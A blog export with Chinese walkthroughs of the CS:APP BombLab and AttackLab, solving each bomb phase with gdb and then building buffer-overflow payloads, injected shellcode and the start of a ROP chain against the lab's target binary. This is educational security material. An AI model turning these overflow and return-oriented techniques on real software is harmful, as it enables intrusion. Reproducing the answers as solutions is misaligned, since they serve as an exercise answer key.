{"posts":[{"title":"CSAPP BombLab","text":"csapp BombLab 第一个炸弹使用 gdb 调试程序1gdb bomb 在 74 行处设置一个断点123438 char *input;......73 input = read_line(); /* Get input */74 phase_1(input); /* Run the phase */ 1break 74 运行该程序到断点位置执行disassemble命令 123 0x0000000000400e32 &lt;+146&gt;: call 0x40149e &lt;read_line&gt;=&gt; 0x0000000000400e37 &lt;+151&gt;: mov %rax,%rdi 0x0000000000400e3a &lt;+154&gt;: call 0x400ee0 &lt;phase_1&gt; 位置400e3a 执行call指令, 调用phase_1, 这个函数的参数是input, 也就是输入字符串的地址, 该函数调用前会将其值保存到%rdi寄存器, 对应位置400e37的指令 例如,输入的字符串是hello 12345(gdb) info registersrax 0x603780 6305664rsi 0x603780 6305664(gdb) x/s 63056640x603780 &lt;input_strings&gt;: &quot;hello&quot; 进入 phase_1函数内部12345678910111213(gdb) stepi0x0000000000400ee0 in phase_1 ()(gdb) disassembleDump of assembler code for function phase_1:=&gt; 0x0000000000400ee0 &lt;+0&gt;: sub $0x8,%rsp 0x0000000000400ee4 &lt;+4&gt;: mov $0x402400,%esi 0x0000000000400ee9 &lt;+9&gt;: call 0x401338 &lt;strings_not_equal&gt; 0x0000000000400eee &lt;+14&gt;: test %eax,%eax 0x0000000000400ef0 &lt;+16&gt;: je 0x400ef7 &lt;phase_1+23&gt; 0x0000000000400ef2 &lt;+18&gt;: call 0x40143a &lt;explode_bomb&gt; 0x0000000000400ef7 &lt;+23&gt;: add $0x8,%rsp 0x0000000000400efb &lt;+27&gt;: retEnd of assembler dump. 位置400ee4处的指令会将0x402400放入%esi中, 然后调用strings_not_equal函数函数执行完毕后, 会根据test %eax,%eax的结果进行跳转, 如果该寄存器的值为0则表示字符串相等phase_1调用结束,反之为1,表示字符串不等,跳转到400ef2调用explode_bomb,在屏幕上输出输出炸弹爆炸的信息 根据phase_1, 目标字符串保存在0x402400位置处, 输入的字符串的地址保存在%rsi中使用x/s address即可输出该位置的字符串 12(gdb) x/s 0x4024000x402400: &quot;Border relations with Canada have never been better.&quot; 拆弹123456$ ./bombWelcome to my fiendish little bomb. You have 6 phases withwhich to blow yourself up. Have a nice day!Border relations with Canada have never been better.Phase 1 defused. How about the next one? 第二个炸弹在第 82 行设置断点在代码中找到调用 phase_2 函数的行，并设置断点： 182 phase_2(input); 进入该函数后，反汇编： 123450x0000000000400efc &lt;+0&gt;: push %rbp0x0000000000400efd &lt;+1&gt;: push %rbx0x0000000000400efe &lt;+2&gt;: sub $0x28,%rsp0x0000000000400f02 &lt;+6&gt;: mov %rsp,%rsi0x0000000000400f05 &lt;+9&gt;: call 0x40145c &lt;read_six_numbers&gt; 在 0x400f05 位置调用了 read_six_numbers 函数。此时 %rdi 的值是 input 的地址，而 %rsi 的值是栈顶指针 %rsp 的值，即： 123(gdb) info registersrsi 0x7fffffffe400 140737488348160rdi 0x6037d0 6305744 分析 read_six_numbers 函数函数 read_six_numbers 的反汇编代码如下： 1234567891011121314(gdb) disassembleDump of assembler code for function read_six_numbers: 0x000000000040145c &lt;+0&gt;: sub $0x18,%rsp 0x0000000000401460 &lt;+4&gt;: mov %rsi,%rdx 0x0000000000401463 &lt;+7&gt;: lea 0x4(%rsi),%rcx 0x0000000000401467 &lt;+11&gt;: lea 0x14(%rsi),%rax 0x000000000040146b &lt;+15&gt;: mov %rax,0x8(%rsp) 0x0000000000401470 &lt;+20&gt;: lea 0x10(%rsi),%rax 0x0000000000401474 &lt;+24&gt;: mov %rax,(%rsp) 0x0000000000401478 &lt;+28&gt;: lea 0xc(%rsi),%r9 0x000000000040147c &lt;+32&gt;: lea 0x8(%rsi),%r8 0x0000000000401480 &lt;+36&gt;: mov $0x4025c3,%esi 0x0000000000401485 &lt;+41&gt;: mov $0x0,%eax 0x000000000040148a &lt;+46&gt;: call 0x400bf0 &lt;__isoc99_sscanf@plt&gt; 该函数调用 sscanf 将输入解析为 6 个整数。其原型为： 1int sscanf(const char *str, const char *format, ...); 参数的映射如下： %rdi：输入字符串的地址 (input)。 %rsi：格式字符串地址 (&quot;%d %d %d %d %d %d&quot;，位于 0x4025c3)。 %rdx, %rcx, %r8, %r9：前四个整数的地址。 栈中保存剩余两个整数的地址 (%rsp+8 和 %rsp)。 输入数据最终被保存到以下地址： 123456rdx 0xe400rcx 0xe404r8 0xe408r9 0xe40c(%rsp) 0xe410(%rsp + 8) 0xe414 验证解析的整数数量是否为 6： 123450x000000000040148f &lt;+51&gt;: cmp $0x5,%eax0x0000000000401492 &lt;+54&gt;: jg 0x401499 &lt;read_six_numbers+61&gt;0x0000000000401494 &lt;+56&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000401499 &lt;+61&gt;: add $0x18,%rsp0x000000000040149d &lt;+65&gt;: ret 若解析的整数少于 6 个，会调用 explode_bomb 函数触发炸弹。注意：使用的是 jg 指令，因此解析的整数超过 6 个不会引发爆炸。 验证数据是否符合要求接着，phase_2 函数开始验证解析的数据是否符合要求。 验证第一个数是否为 11230x0000000000400f0a &lt;+14&gt;: cmpl $0x1,(%rsp)0x0000000000400f0e &lt;+18&gt;: je 0x400f30 &lt;phase_2+52&gt;0x0000000000400f10 &lt;+20&gt;: call 0x40143a &lt;explode_bomb&gt; 若第一个数不等于 1，则触发炸弹。此时： 12(gdb) x/4x 0x7fffffffe4000x7fffffffe400: 0x01 0x00 0x00 0x00 第一个数为 1，符合要求。 验证后续数据如果第一个数正确，跳转到 0x400f30 进入循环： 1230x0000000000400f30 &lt;+52&gt;: lea 0x4(%rsp),%rbx0x0000000000400f35 &lt;+57&gt;: lea 0x18(%rsp),%rbp0x0000000000400f3a &lt;+62&gt;: jmp 0x400f17 &lt;phase_2+27&gt; 其中： %rbp = %rsp + 0x18：指向最后一个数的地址。 %rbx = %rsp + 0x4：指向第二个数的地址。 循环体代码如下： 123456780x0000000000400f17 &lt;+27&gt;: mov -0x4(%rbx),%eax0x0000000000400f1a &lt;+30&gt;: add %eax,%eax0x0000000000400f1c &lt;+32&gt;: cmp %eax,(%rbx)0x0000000000400f1e &lt;+34&gt;: je 0x400f25 &lt;phase_2+41&gt;0x0000000000400f20 &lt;+36&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000400f25 &lt;+41&gt;: add $0x4,%rbx0x0000000000400f29 &lt;+45&gt;: cmp %rbp,%rbx0x0000000000400f2c &lt;+48&gt;: jne 0x400f17 &lt;phase_2+27&gt; 将上一个数（%rbx-4）的值乘 2。 将结果与当前数（%rbx）比较，若不相等则触发炸弹。 将 %rbx 加 4，指向下一个数。 若未到达 %rbp（最后一个数），继续循环。 这一逻辑类似于以下 C 代码： 12345for (int i = 1; i &lt; 6; i++) { if (numbers[i] != 2 * numbers[i - 1]) { explode_bomb(); }} 正确输入经过分析，要求输入的 6 个整数是一个以 1 开始、每个数是前一个数的 2 倍的序列。正确输入为： 11 2 4 8 16 32 完整拆弹过程示例： 123456Welcome to my fiendish little bomb. You have 6 phases withwhich to blow yourself up. Have a nice day!Border relations with Canada have never been better.Phase 1 defused. How about the next one?1 2 4 8 16 32 a b cThat's number 2. Keep going! 第三个炸弹设置断点, 反汇编函数在 89 行处设置断点,进入phase_3函数, 反汇编该函数 第一部分: 1234567891011(gdb) disassembleDump of assembler code for function phase_3:=&gt; 0x0000000000400f43 &lt;+0&gt;: sub $0x18,%rsp 0x0000000000400f47 &lt;+4&gt;: lea 0xc(%rsp),%rcx 0x0000000000400f4c &lt;+9&gt;: lea 0x8(%rsp),%rdx 0x0000000000400f51 &lt;+14&gt;: mov $0x4025cf,%esi 0x0000000000400f56 &lt;+19&gt;: mov $0x0,%eax 0x0000000000400f5b &lt;+24&gt;: call 0x400bf0 &lt;__isoc99_sscanf@plt&gt; 0x0000000000400f60 &lt;+29&gt;: cmp $0x1,%eax 0x0000000000400f63 &lt;+32&gt;: jg 0x400f6a &lt;phase_3+39&gt; 0x0000000000400f65 &lt;+34&gt;: call 0x40143a &lt;explode_bomb&gt; 会从输入中读入两个int类型的数据, 放入 %rsp + 0x8和%rsp + 0xc这两个位置 12(gdb) print $rsp$1 = (void *) 0x7fffffffe458 也就是 1234&gt;&gt;&gt; hex(0x7fffffffe458 + 0x8)'0x7fffffffe460'&gt;&gt;&gt; hex(0x7fffffffe458 + 0xc)'0x7fffffffe464' 第二部分 设第一个数为x 120x0000000000400f6a &lt;+39&gt;: cmpl $0x7,0x8(%rsp)0x0000000000400f6f &lt;+44&gt;: ja 0x400fad &lt;phase_3+106&gt; 根据上述汇编, x &lt;= 7 120x0000000000400f71 &lt;+46&gt;: mov 0x8(%rsp),%eax0x0000000000400f75 &lt;+50&gt;: jmp *0x402470(,%rax,8) 取出位置0x402470 + 8x的值,将其作为下一条指令的地址 123456&gt;&gt;&gt; hex(0x402470 + 0)'0x402470'&gt;&gt;&gt; hex(0x402470 + 8)'0x402478'&gt;&gt;&gt; hex(0x402470 + 16)'0x402480' 查看这些地址存放的值 12345(gdb) x/16x 0x4024700x402470: 0x00400f7c 0x00000000 0x00400fb9 0x000000000x402480: 0x00400f83 0x00000000 0x00400f8a 0x000000000x402490: 0x00400f91 0x00000000 0x00400f98 0x000000000x4024a0: 0x00400f9f 0x00000000 0x00400fa6 0x00000000 例如, 当x == 0时, 取出位置0x402470的值,也就是 0x00400f7c, 跳转到该地址, 执行以下指令 1234560x0000000000400f7c &lt;+57&gt;: mov $0xcf,%eax0x0000000000400f81 &lt;+62&gt;: jmp 0x400fbe &lt;phase_3+123&gt;...0x0000000000400fbe &lt;+123&gt;: cmp 0xc(%rsp),%eax0x0000000000400fc2 &lt;+127&gt;: je 0x400fc9 &lt;phase_3+134&gt;0x0000000000400fc4 &lt;+129&gt;: call 0x40143a &lt;explode_bomb&gt; 这种情况下就会比较第二个数和0xcf是否相等 同理, 当x == 1时, 会测试第二个数是否等于0x137 拆弹: 12345678Welcome to my fiendish little bomb. You have 6 phases withwhich to blow yourself up. Have a nice day!Border relations with Canada have never been better.Phase 1 defused. How about the next one?1 2 4 8 16 32That's number 2. Keep going!0 207Halfway there! 第四个炸弹反汇编 phase_4函数12345678910111213141516...0x0000000000401024 &lt;+24&gt;: call 0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000401029 &lt;+29&gt;: cmp $0x2,%eax0x000000000040102c &lt;+32&gt;: jne 0x401035 &lt;phase_4+41&gt;...0x000000000040102e &lt;+34&gt;: cmpl $0xe,0x8(%rsp)0x0000000000401033 &lt;+39&gt;: jbe 0x40103a &lt;phase_4+46&gt;0x0000000000401035 &lt;+41&gt;: call 0x40143a &lt;explode_bomb&gt;...0x0000000000401048 &lt;+60&gt;: call 0x400fce &lt;func4&gt;0x000000000040104d &lt;+65&gt;: test %eax,%eax0x000000000040104f &lt;+67&gt;: jne 0x401058 &lt;phase_4+76&gt;...0x0000000000401051 &lt;+69&gt;: cmpl $0x0,0xc(%rsp)0x0000000000401056 &lt;+74&gt;: je 0x40105d &lt;phase_4+81&gt;0x0000000000401058 &lt;+76&gt;: call 0x40143a &lt;explode_bomb&gt; 从这段汇编代码, 可以得出以下信息: 能够从输入中得到两个整数 第一个数 x, x &lt;= 14 func4 函数的返回值 %rax == 0 第二个数 y, y == 0 反汇编 func4函数从整体来看, func4函数调用了自己, 所以这是一个递归程序 12345670x0000000000400fe2 &lt;+20&gt;: cmp %edi,%ecx0x0000000000400fe4 &lt;+22&gt;: jle 0x400ff2 &lt;func4+36&gt;...0x0000000000400fe9 &lt;+27&gt;: call 0x400fce &lt;func4&gt;...0x0000000000400ffe &lt;+48&gt;: call 0x400fce &lt;func4&gt; 第一部分: 123456780x0000000000400fce &lt;+0&gt;: sub $0x8,%rsp0x0000000000400fd2 &lt;+4&gt;: mov %edx,%eax0x0000000000400fd4 &lt;+6&gt;: sub %esi,%eax0x0000000000400fd6 &lt;+8&gt;: mov %eax,%ecx0x0000000000400fd8 &lt;+10&gt;: shr $0x1f,%ecx0x0000000000400fdb &lt;+13&gt;: add %ecx,%eax0x0000000000400fdd &lt;+15&gt;: sar $1,%eax0x0000000000400fdf &lt;+17&gt;: lea (%rax,%rsi,1),%ecx 函数的参数分别保存在%rdi, %rsi, %rdx, %rcx 中,在这里使用a, b, c, d表示调用函数时, 假设参数分别为1, 0, 14, 0,执行上诉汇编代码: 1234567m = c = 14m = m - b = 14 - 0 = 14d = m = 14d = d &gt;&gt; 31 = 14 &gt;&gt; 31 = 0m = m + d = 14 + 0 = 14m = 14 &gt;&gt; 1 = 7d = 7 + b = 7 + 0 = 7 可以看出, 这段代码的功能是求区间[b, c]的中间值,保存在d中 第二部分: 知道了区间的中点后,将其和x进行比较, 会根据结果进入不同分支 120x0000000000400fe2 &lt;+20&gt;: cmp %edi,%ecx0x0000000000400fe4 &lt;+22&gt;: jle 0x400ff2 &lt;func4+36&gt; 假设不满足d &lt;= a这个条件 , 即中间值比x大, 跳转, 会执行下述汇编代码 120x0000000000400fe6 &lt;+24&gt;: lea -0x1(%rcx),%edx0x0000000000400fe9 &lt;+27&gt;: call 0x400fce &lt;func4&gt; 此时发起的调用为func(1, 0, 6, 7), 从区间[0, 6]查找 假设满足这个条件, 跳转, 执行下述汇编代码 1234560x0000000000400ff2 &lt;+36&gt;: mov $0x0,%eax0x0000000000400ff7 &lt;+41&gt;: cmp %edi,%ecx0x0000000000400ff9 &lt;+43&gt;: jge 0x401007 &lt;func4+57&gt;0x0000000000400ffb &lt;+45&gt;: lea 0x1(%rcx),%esi0x0000000000400ffe &lt;+48&gt;: call 0x400fce &lt;func4&gt;0x0000000000401003 &lt;+53&gt;: lea 0x1(%rax,%rax,1),%eax 这里也有两个分支 120x0000000000400ff7 &lt;+41&gt;: cmp %edi,%ecx0x0000000000400ff9 &lt;+43&gt;: jge 0x401007 &lt;func4+57&gt; 满足这个条件d &gt;= a, 结合上一个条件d &lt;= a,即d == a时,函数执行返回 如果不满足这个条件d &gt;= a, 此时发起的调用为func(1, 8, 14, 7)注意到, 这个分支会将使得%rax = 2 * %rax + 1, 结合函数执行返回时,要让%rax = 0, 也就是说,只要执行该分支的代码就必然不满足%rax == 0的条件 func4的python版本根据上面, 函数的整体逻辑为: 123456if d &lt;= a: if d &gt;= a: return 0 return 2 * fun(1, 8, 14, 7) + 1else: return 2 * func(1, 0, 6, 7) 这是一个二分搜索, 搜索区间为[b, c], 满足%rax == 0条件的x 不位于二分搜索树的右子树 以下是python版本 1234567891011121314151617181920212223242526def func(x, y, m, n): a = m - y n = a &gt;&gt; 31 a = a + n a = a &gt;&gt; 1 n = a + y # n middle of the [y, m] if n &lt;= x: if n &gt;= x: return 0 a = func(x, n + 1, m, n) return 2 * a + 1 else: a = func(x, y, n - 1, n) return a * 2# 测试结果for i in range(0, 15): if func(i, 0, 14, 0) == 0: print(i)# 0 1 3 7# [0, 14]# [0, 7], [8, 14]# [0, 3], [4, 7];# [0, 1]# [0, 0] 拆弹: 12345678910Welcome to my fiendish little bomb. You have 6 phases withwhich to blow yourself up. Have a nice day!Border relations with Canada have never been better.Phase 1 defused. How about the next one?1 2 4 8 16 32That's number 2. Keep going!1 311Halfway there!3 0So you got that one. Try this one. 第五个炸弹先看汇编代码位置0x4010b3后的内容 根据函数strings_not_equal知道,比较的应该是两个字符串 将 rsp+16 (rsp+0x10)处的值和0x40245e位置的值进行比较, 相等则结束,否则炸弹爆炸 123456780x00000000004010b3 &lt;+81&gt;: mov $0x40245e,%esi0x00000000004010b8 &lt;+86&gt;: lea 0x10(%rsp),%rdi0x00000000004010bd &lt;+91&gt;: call 0x401338 &lt;strings_not_equal&gt;0x00000000004010c2 &lt;+96&gt;: test %eax,%eax0x00000000004010c4 &lt;+98&gt;: je 0x4010d9 &lt;phase_5+119&gt;0x00000000004010c6 &lt;+100&gt;: call 0x40143a &lt;explode_bomb&gt;0x00000000004010cb &lt;+105&gt;: nopl 0x0(%rax,%rax,1)0x00000000004010d0 &lt;+110&gt;: jmp 0x4010d9 &lt;phase_5+119&gt; 看一下0x40245e保存的字符串,也就是要得到的字符串是flyers 12(gdb) x/s 0x40245e0x40245e: &quot;flyers&quot; 回到代码的开头,可知输入的长度为 612340x000000000040107a &lt;+24&gt;: call 0x40131b &lt;string_length&gt;0x000000000040107f &lt;+29&gt;: cmp $0x6,%eax0x0000000000401082 &lt;+32&gt;: je 0x4010d2 &lt;phase_5+112&gt;0x0000000000401084 &lt;+34&gt;: call 0x40143a &lt;explode_bomb&gt; 代码的主体部分12340x000000000040108b &lt;+41&gt;: movzbl (%rbx,%rax,1),%ecx0x000000000040108f &lt;+45&gt;: mov %cl,(%rsp)0x0000000000401092 &lt;+48&gt;: mov (%rsp),%rdx0x0000000000401096 &lt;+52&gt;: and $0xf,%edx 10x0000000000401067 &lt;+5&gt;: mov %rdi,%rbx 根据代码开头的汇编,知道rbx保存了输入的位置,结合这部分代码,会取出输入的最低 4 位放入edx中 然后下面接下来的指令: 123450x0000000000401099 &lt;+55&gt;: movzbl 0x4024b0(%rdx),%edx0x00000000004010a0 &lt;+62&gt;: mov %dl,0x10(%rsp,%rax,1)0x00000000004010a4 &lt;+66&gt;: add $0x1,%rax0x00000000004010a8 &lt;+70&gt;: cmp $0x6,%rax0x00000000004010ac &lt;+74&gt;: jne 0x40108b &lt;phase_5+41&gt; 0x401099处指令表示取出0x4024b0+rdx的 1 字节并零扩展到 4 字节放入edx中然后将dl中的数据放入0x10(%rsp,%rax,1)位置处最后将rax的值加 1, 重复上诉过程 查看0x4024b0位置处的值 12(gdb) x/s 0x4024b00x4024b0 &lt;array.3449&gt;: &quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot; 所以可以知道,代码的整体流程会从0x4024b0挑选出6个字符,放在以rsp+16开始的位置,不妨取偏移为9 15 14 5 6 7,即9 f e 5 6 7比较 ASCII码表,选择低字节满足要求的字符,不妨取9on567注意,答案不止一种 第六个炸弹保存输入位置0x401106处的指令call 0x40145c &lt;read_six_numbers&gt;根据前面的阶段可以知道会读入6个数,分别放入位置 rsp, rsp+4, rsp+8, rsp+12, rsp+16, rsp+20 检查输入从0x401117到0x401151处的指令会对输入做一些检查 每个数都小于等于 6,并且大于 0 每个数各不相同 检查一寄存器r13初始值为rsp的值,也就是第一个输入的值位置0x401114到0x401123处的指令会比较该值减去 1 和 5 的关系,如果大与 5,炸弹爆炸,否则正常进行 1234560x0000000000401114 &lt;+32&gt;: mov %r13,%rbp0x0000000000401117 &lt;+35&gt;: mov 0x0(%r13),%eax0x000000000040111b &lt;+39&gt;: sub $0x1,%eax0x000000000040111e &lt;+42&gt;: cmp $0x5,%eax0x0000000000401121 &lt;+45&gt;: jbe 0x401128 &lt;phase_6+52&gt;0x0000000000401123 &lt;+47&gt;: call 0x40143a &lt;explode_bomb&gt; 位置0x40114d处的指令, 将r13的值加 4,也就是下一个输入的位置,然后重新跳转到0x401114 120x000000000040114d &lt;+89&gt;: add $0x4,%r130x0000000000401151 &lt;+93&gt;: jmp 0x401114 &lt;phase_6+32&gt; 在每次检查,寄存器r12d会增加 1位置0x40112c处的指令: 120x000000000040112c &lt;+56&gt;: cmp $0x6,%r12d0x0000000000401130 &lt;+60&gt;: je 0x401153 &lt;phase_6+95&gt; 知当寄存器r12d等于 6 时,结束循环,且r12d表示这是第几个输入 检查二检查一是外层循环, 内层循环会检查各个数之间的相等关系位置0x401132到位置0x40114b是内层循环的主体部分, 寄存器ebx是迭代变量,通过0x401138处的指令mov (%rsp,%rax,4),%eax, 将值放入eax中然后比较eax和rbp中的值如果不等,正常进行,否则炸弹爆炸 123456789 0x0000000000401132 &lt;+62&gt;: mov %r12d,%ebx0x0000000000401135 &lt;+65&gt;: movslq %ebx,%rax0x0000000000401138 &lt;+68&gt;: mov (%rsp,%rax,4),%eax0x000000000040113b &lt;+71&gt;: cmp %eax,0x0(%rbp)0x000000000040113e &lt;+74&gt;: jne 0x401145 &lt;phase_6+81&gt;0x0000000000401140 &lt;+76&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000401145 &lt;+81&gt;: add $0x1,%ebx0x0000000000401148 &lt;+84&gt;: cmp $0x5,%ebx0x000000000040114b &lt;+87&gt;: jle 0x401135 &lt;phase_6+65&gt; 从检查二和检查一可以知道,这六个输入为 1 到 6 的数,且各不相等 处理输入1234567890x0000000000401153 &lt;+95&gt;: lea 0x18(%rsp),%rsi0x0000000000401158 &lt;+100&gt;: mov %r14,%rax0x000000000040115b &lt;+103&gt;: mov $0x7,%ecx0x0000000000401160 &lt;+108&gt;: mov %ecx,%edx0x0000000000401162 &lt;+110&gt;: sub (%rax),%edx0x0000000000401164 &lt;+112&gt;: mov %edx,(%rax)0x0000000000401166 &lt;+114&gt;: add $0x4,%rax0x000000000040116a &lt;+118&gt;: cmp %rsi,%rax0x000000000040116d &lt;+121&gt;: jne 0x401160 &lt;phase_6+108&gt; 这部分代码的功能为 x = 7 - x,并将结果放回原处,x 为输入的数据 获取节点的位置指令跳转到0x401197处, 将值保存到寄存器ecx中,而且结合下面的指令: 1230x000000000040118d &lt;+153&gt;: add $0x4,%rsi0x0000000000401191 &lt;+157&gt;: cmp $0x18,%rsi0x0000000000401195 &lt;+161&gt;: je 0x4011ab &lt;phase_6+183&gt; 可以知道: 这是个循环, 只有当rsi等于0x18时才会推出循环 ecx保存的是输入值 该循环也有一个内层循环,位置从0x401176到0x40117f:会根据ecx的值进行循环,每次循环将rdx的值加 8,当eax = ecx时,将rdx的值保存到0x20(%rsp,%rsi,2)位置处 根据上面的代码, 可以知道会将节点位置分别保存在rsp+20, rsp+28, rsp+30, rsp+38, rsp+40, rsp+48(16 进制),这些节点和7-x存在一一对应的关系,如当7-x==1时,该位置则对应第一个节点, 最后在 0x401195处结束循环, 跳转到 位置4011ab 链接节点123456789101112130x00000000004011ab &lt;+183&gt;: mov 0x20(%rsp),%rbx0x00000000004011b0 &lt;+188&gt;: lea 0x28(%rsp),%rax0x00000000004011b5 &lt;+193&gt;: lea 0x50(%rsp),%rsi0x00000000004011ba &lt;+198&gt;: mov %rbx,%rcx0x00000000004011bd &lt;+201&gt;: mov (%rax),%rdx0x00000000004011c0 &lt;+204&gt;: mov %rdx,0x8(%rcx)0x00000000004011c4 &lt;+208&gt;: add $0x8,%rax0x00000000004011c8 &lt;+212&gt;: cmp %rsi,%rax0x00000000004011cb &lt;+215&gt;: je 0x4011d2 &lt;phase_6+222&gt;0x00000000004011cd &lt;+217&gt;: mov %rdx,%rcx0x00000000004011d0 &lt;+220&gt;: jmp 0x4011bd &lt;phase_6+201&gt;0x00000000004011d2 &lt;+222&gt;: movq $0x0,0x8(%rdx) 0x4011c0处的指令会将节点链接起来,形成一个链表,链表的顺序为7 - x的顺序, 比较节点大小0x4011e3取出 4 字节的内容放入eax中比较rbx地址保存的值和eax比较,若后者大于前者则正常进行,否则炸弹爆炸,以此类推节点 1 &gt; 节点 2 &gt; 节点 3 &gt; 节点 4 &gt; 节点 5 &gt; 节点 6 123450x00000000004011df &lt;+235&gt;: mov 0x8(%rbx),%rax0x00000000004011e3 &lt;+239&gt;: mov (%rax),%eax0x00000000004011e5 &lt;+241&gt;: cmp %eax,(%rbx)0x00000000004011e7 &lt;+243&gt;: jge 0x4011ee &lt;phase_6+250&gt;0x00000000004011e9 &lt;+245&gt;: call 0x40143a &lt;explode_bomb&gt; 查看 0x6032d0开始的节点和其值 要满足递减的顺序,所以其排列为3, 4, 5, 6, 1, 2所以输入的数为7-x, 即4, 3, 2, 1, 6, 5","link":"/posts/f788923f.html"},{"title":"CSAPP AttackLab","text":"csapp AttackLab Phase 1首先获取 ctarget 的汇编代码 1objdump -d ctarget ctarget.s 查看getbuf函数,确定分配的空间 1234017a8: 48 83 ec 28 sub $0x28,%rsp4017ac: 48 89 e7 mov %rsp,%rdi4017af: e8 8c 02 00 00 call 401a40 &lt;Gets&gt; 发现分配了0x28 = 40字节的空间用于保存输入, 从而知道调用函数的返回地址是%rsp + 40处,只要将这个地址用touch1的地址覆盖,即可完成攻击 查看touch1的地址 100000000004017c0 &lt;touch1&gt;: 也就是在0x4017c0处所以得到我们的输入字符串为 12345600 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00c0 17 40 00 将其保存在phase1.txt中,进行测试 123456789$ ./hex2raw &lt;phase1.txt |./ctarget -qCookie: 0x59b997faType string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 Phase 2查看touch2的源代码 1234567void touch2(unsigned val) { vlevel = 2; if (val == cookie) { // ... } // ...} touch2与touch1不同之处在于前者接受一个无符号整数类型的参数, 而且要与cookie进行比较所以我们必须先把 cookie 的值传给参数 val, 根据x86-64惯例,也就是寄存器%rdi 123movq $0x59b997fa, %rdipushq $0x4017ec # touch2的地址ret 这里首先将cookie保存到%rdi中, 然后将touch2的地址压栈,最后返回.这样就可以跳转到touch2并将cookie传入参数将代码保存到文件phase2.s中, 然后转换成对应的机器码 12gcc -c phase2.sobjdump -d phase2.o &gt; phase2.byte 得到的机器码内容是 12340000000000000000 &lt;.text&gt;: 0: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7: 68 ec 17 40 00 push $0x4017ec c: c3 ret 和phase1的思路相同,将这段代码保存在输入缓冲区中,然后覆盖返回地址即可执行,为此需要知道缓冲区的地址 1234567891011(gdb) disassembleDump of assembler code for function getbuf: 0x00000000004017a8 &lt;+0&gt;: sub $0x28,%rsp=&gt; 0x00000000004017ac &lt;+4&gt;: mov %rsp,%rdi 0x00000000004017af &lt;+7&gt;: call 0x401a40 &lt;Gets&gt; 0x00000000004017b4 &lt;+12&gt;: mov $0x1,%eax 0x00000000004017b9 &lt;+17&gt;: add $0x28,%rsp 0x00000000004017bd &lt;+21&gt;: retEnd of assembler dump.(gdb) display $rsp1: $rsp = (void *) 0x5561dc78 所以得到我们的输入为 12345648 c7 c7 fa 97 b9 59 68ec 17 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 将其保存在phase2.txt中, 进行测试 123456789$ ./hex2raw &lt;phase2.txt | ./ctarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 Phase 3首先， 看touch3的c代码 123456void touch3(char *sval){ vlevel=3; /* Partofvalidationprotocol */ if (hexmatch(cookie,sval)){ //... } touch3的参数是一个指针，指向了一个字符串, 然后调用hexmatch进行比较。所以可以得到下面的信息：传递给%rdi的值应该是cookie的地址，并且要以ASCII来表示 通过查表得到字符串的表示： 12// 0x59b997fa35 39 62 39 39 37 66 61 调用hexmatch前，位置0x5561dc78处的信息： 1234560x5561dc78: 0xb8c7c748 0x685561dc 0x004018fa 0x000000c30x5561dc88: 0xffffffff 0xffffffff 0xffffffff 0xffffffff0x5561dc98: 0x00401916 0x00000000 0x55586000 0x000000000x5561dca8: 0xffffffff 0xffffffff 0xffffffff 0xffffffff0x5561dcb8: 0x39623935 0x61663739 0xf4f4f400 0xf4f4f4f4 调用该函数后： 1234560x5561dc78: 0xb8c7c748 0x685561dc 0x5561dcb8 0x000000000x5561dc88: 0x55685fe8 0x00000000 0x00000002 0x000000000x5561dc98: 0x00401916 0x00000000 0x55586000 0x000000000x5561dca8: 0xffffffff 0xffffffff 0xffffffff 0xffffffff0x5561dcb8: 0x39623935 0x61663739 0xf4f4f400 0xf4f4f4f4 可以看到，输入被覆盖了， 所以不能将cookie保存在getbuf的栈中，同时也注意到地址a8后的内容没有被改变，所以可以将其保存在这个位置 这里保存在b8位置处, 汇编代码为 123movq $0x5561dcb8, %rdipushq $0x004018faret 最终的输入是 12345678948 c7 c7 b8 dc 61 55 68fa 18 40 00 c3 00 00 00ff ff ff ff ff ff ff ffff ff ff ff ff ff ff ffff ff ff ff ff ff ff ff78 dc 61 55 00 00 00 00ff ff ff ff ff ff ff ffff ff ff ff ff ff ff ff35 39 62 39 39 37 66 61 测试 123456789$ ./hex2raw &lt; p3.txt |./ctarget -qCookie: 0x59b997faType string:Touch3!: You called touch3(&quot;59b997fa&quot;)Valid solution for level 3 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:3:48 C7 C7 B8 DC 61 55 68 FA 18 40 00 C3 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 78 DC 61 55 00 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 35 39 62 39 39 37 66 61 Phase 4rtarget使用了两种技术防止缓冲区溢出攻击： 栈随机化 ：每一次运行栈的位置都不同，这样就不能找到注入代码的位置 限制可执行区域：栈为不可执行区域，一旦执行栈上的代码，就会出现段错误 攻击办法是利用已经存在的代码，而不是注入代码，这种方式称为ROP攻击按照 lab 要求，需要的代码位置在start_farm 和 end_farm之间 明白了上面的情况，就可以开始进行实验和Phase 2一样，仍然要将cookie放入%rdi中，根据实验给出的机器码，需要查找开头为48 89的指令， 且目的寄存器是%rdi满足条件的有： 123456789# 对应的指令地址是 4019a200000000004019a0 &lt;addval_273&gt;: 4019a0: 8d 87 48 89 c7 c3 